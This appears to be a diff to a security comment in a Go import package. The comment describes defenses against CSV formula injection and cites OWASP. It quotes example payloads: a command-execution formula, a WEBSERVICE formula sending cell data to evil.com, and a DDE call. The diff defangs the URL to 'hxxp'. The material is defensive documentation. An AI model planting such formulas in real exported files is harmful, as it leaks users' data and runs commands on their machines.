@@ -5,7 +5,7 @@ package importpkg
 //
 // SECURITY: Protects against injection attacks where malicious formulas (=, +, -, @) could:
 //   - Execute arbitrary commands (=cmd|'/c calc'!A1)
-//   - Exfiltrate data (=WEBSERVICE("http://evil.com/"&A1))
+//   - Exfiltrate data (=WEBSERVICE("hxxp://evil.com/"&A1))
 //   - Access local files (=DDE(...))
 //
 // Reference: OWASP CSV Injection (https://owasp.org/www-community/attacks/CSV_Injection)
